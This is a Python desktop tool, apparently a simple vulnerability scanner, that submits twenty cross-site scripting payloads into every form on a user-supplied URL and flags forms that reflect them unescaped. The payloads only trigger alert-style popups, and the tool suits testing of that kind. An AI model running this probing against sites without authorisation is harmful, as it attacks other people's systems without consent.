import requests
from bs4 import BeautifulSoup
import urllib.parse
import tkinter as tk
from tkinter import scrolledtext, messagebox
import threading

# 20 XSS Payloads
payloads = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "'><script>alert(1)</script>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<body onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<script src=data:text/javascript,alert(1)></script>",
    "<object data=javascript:alert(1)>",
    "<video><source onerror=\"alert(1)\"></video>",
    "<a href='javascript:alert(1)'>Click</a>",
    "<form><button formaction='javascript:alert(1)'>CLICK</button></form>",
    "<script>confirm(1)</script>",
    "<script>prompt(1)</script>",
    "<img src=1 onerror=prompt(1)>",
    "<script>eval('alert(1)')</script>",
    "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
    "<img src='x' onerror='alert(1)'>",
    "<div onpointerover='alert(1)'>Hover me</div>",
    "<button onclick=alert(1)>Click</button>"
]

# Extract forms
def get_forms(url):
    soup = BeautifulSoup(requests.get(url).text, "html.parser")
    return soup.find_all("form")

# Extract form details
def get_form_details(form):
    details = {"action": form.attrs.get("action"), "method": form.attrs.get("method", "get").lower(), "inputs": []}
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        name = input_tag.attrs.get("name")
        details["inputs"].append({"type": input_type, "name": name})
    return details

# Submit form with payload
def submit_form(form_details, url, payload):
    target_url = urllib.parse.urljoin(url, form_details["action"])
    data = {input["name"]: payload for input in form_details["inputs"] if input["name"]}
    if form_details["method"] == "post":
        return requests.post(target_url, data=data)
    else:
        return requests.get(target_url, params=data)

# XSS scanning function
def scan_xss():
    url = url_entry.get().strip()
    if not url:
        messagebox.showerror("Input Error", "Please enter a valid URL.")
        return

    output_text.delete("1.0", tk.END)
    output_text.insert(tk.END, f"Scanning {url} for XSS vulnerabilities...\n\n")
    try:
        forms = get_forms(url)
        output_text.insert(tk.END, f"Detected {len(forms)} forms.\n\n")

        for i, form in enumerate(forms):
            form_details = get_form_details(form)
            output_text.insert(tk.END, f"[Form {i+1}] {form_details}\n", "form")
            for payload in payloads:
                response = submit_form(form_details, url, payload)
                if payload in response.text:
                    output_text.insert(tk.END, f"[*] XSS Vulnerability Detected!\nPayload: {payload}\n\n", "vuln")
                    break
            else:
                output_text.insert(tk.END, "[-] No vulnerability detected in this form.\n\n", "safe")
    except Exception as e:
        output_text.insert(tk.END, f"Error: {e}\n", "error")

# GUI Setup
root = tk.Tk()
root.title("XSS Vulnerability Scanner")
root.geometry("800x600")
root.configure(bg="#1e1e1e")

title_label = tk.Label(root, text="XSS Scanner", font=("Helvetica", 20, "bold"), fg="#00ffcc", bg="#1e1e1e")
title_label.pack(pady=10)

frame = tk.Frame(root, bg="#1e1e1e")
frame.pack(pady=5)

url_label = tk.Label(frame, text="Enter URL:", font=("Helvetica", 12), bg="#1e1e1e", fg="#ffffff")
url_label.pack(side=tk.LEFT, padx=5)

url_entry = tk.Entry(frame, width=60, font=("Helvetica", 12))
url_entry.pack(side=tk.LEFT, padx=5)

# Run scan in a new thread
scan_button = tk.Button(root, text="Scan", font=("Helvetica", 12, "bold"), bg="#00cc66", fg="white",
                        command=lambda: threading.Thread(target=scan_xss).start())
scan_button.pack(pady=10)

output_text = scrolledtext.ScrolledText(root, wrap=tk.WORD, width=90, height=25, font=("Courier", 10),
                                        bg="#2b2b2b", fg="#ffffff", insertbackground="white")
output_text.pack(padx=10, pady=10)

# Tag styles
output_text.tag_config("form", foreground="#00ffff")
output_text.tag_config("vuln", foreground="#ff4d4d")
output_text.tag_config("safe", foreground="#00ff00")
output_text.tag_config("error", foreground="#ffcc00")

root.mainloop()
